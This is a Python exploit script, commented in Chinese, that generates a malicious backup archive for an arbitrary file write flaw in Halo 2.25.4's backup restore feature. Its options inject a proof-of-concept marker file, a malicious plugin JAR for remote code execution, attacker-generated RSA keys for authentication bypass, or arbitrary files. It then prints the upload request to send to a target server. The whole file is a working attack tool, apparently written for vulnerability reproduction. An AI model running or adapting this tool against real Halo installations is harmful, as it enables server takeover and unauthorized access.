#!/usr/bin/env python3
"""
Halo 2.25.4 恶意备份生成器

生成用于CVE-XXXX-XXXXX (H-2) 漏洞复现的恶意备份文件
可自定义注入文件内容

用法:
    python generate-malicious-backup.py [选项]

示例:
    # 生成包含标记文件的PoC备份
    python generate-malicious-backup.py

    # 生成包含恶意插件的备份（RCE）
    python generate-malicious-backup.py --plugin evil-plugin.jar

    # 生成包含恶意RSA密钥的备份（认证绕过）
    python generate-malicious-backup.py --key
"""

import io
import os
import sys
import json
import zipfile
import argparse
import base64
from datetime import datetime


def create_poc_backup():
    """创建PoC验证备份"""
    print("[*] Creating PoC verification backup...")
    content = f"""=== Halo Backup Restore Arbitrary File Write PoC ===
Generated: {datetime.now().isoformat()}
Vulnerability: Backup Restore Arbitrary File Write
CVSS: 8.8 (High)
Component: MigrationServiceImpl.restoreWorkdir()
Impact: Arbitrary file write to ~/.halo2/
"""
    return "PWNED_BY_POC.txt", content


def create_plugin_backup(jar_path):
    """创建包含恶意插件的备份"""
    print(f"[*] Creating plugin backup with: {jar_path}")
    if not os.path.exists(jar_path):
        print(f"[-] File not found: {jar_path}")
        sys.exit(1)
    return "plugins/malicious-plugin.jar", open(jar_path, 'rb').read()


def create_key_backup():
    """创建包含恶意RSA密钥的备份"""
    print("[*] Creating RSA key backup...")
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend

        # 生成新密钥对
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=default_backend()
        )
        priv_key = key.private_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        pub_key = key.public_key().public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return [("keys/pat_id_rsa", priv_key), ("keys/pat_id_rsa.pub", pub_key)]
    except ImportError:
        print("[-] cryptography library required: pip install cryptography")
        sys.exit(1)


def generate_backup(output_file, files_to_inject):
    """生成恶意备份ZIP"""
    print(f"\n[*] Generating malicious backup: {output_file}")

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        # 合法的extensions.data（空行格式）
        zf.writestr('extensions.data', '\n')

        # 注入恶意文件
        for filepath, content in files_to_inject:
            if isinstance(content, str):
                content = content.encode('utf-8')
            zf.writestr(f'workdir/{filepath}', content)
            print(f"    [+] Injected: workdir/{filepath} ({len(content)} bytes)")

    # 写入文件
    with open(output_file, 'wb') as f:
        f.write(buf.getvalue())

    print(f"\n[+] Malicious backup created: {output_file}")
    print(f"[+] Size: {os.path.getsize(output_file)} bytes")
    print(f"\n[*] Upload to Halo:")
    print(f"    POST http://target:8090/apis/console.api.migration.halo.run/v1alpha1/restorations")
    print(f"    Content-Type: multipart/form-data")
    print(f"    Cookie: SESSION=xxx")
    print(f"    file=@{output_file}")


def main():
    parser = argparse.ArgumentParser(description='Halo malicious backup generator')
    parser.add_argument('--output', '-o', default='malicious-backup.zip',
                        help='Output file name (default: malicious-backup.zip)')
    parser.add_argument('--plugin', '-p', help='Path to malicious plugin JAR')
    parser.add_argument('--key', '-k', action='store_true',
                        help='Generate malicious RSA key pair')
    parser.add_argument('--file', '-f', help='Inject arbitrary file (path:content)')
    args = parser.parse_args()

    files_to_inject = []

    # 默认: PoC验证文件
    if not args.plugin and not args.key and not args.file:
        filepath, content = create_poc_backup()
        files_to_inject.append((filepath, content))

    # 注入恶意插件
    if args.plugin:
        filepath, content = create_plugin_backup(args.plugin)
        files_to_inject.append((filepath, content))

    # 注入恶意RSA密钥
    if args.key:
        key_files = create_key_backup()
        files_to_inject.extend(key_files)

    # 注入任意文件
    if args.file:
        parts = args.file.split(':', 1)
        if len(parts) == 2:
            filepath, content = parts
            files_to_inject.append((filepath, content))
        else:
            print("[-] Invalid format. Use: --file 'path:content'")
            sys.exit(1)

    if not files_to_inject:
        print("[-] No files to inject")
        sys.exit(1)

    generate_backup(args.output, files_to_inject)


if __name__ == "__main__":
    main()
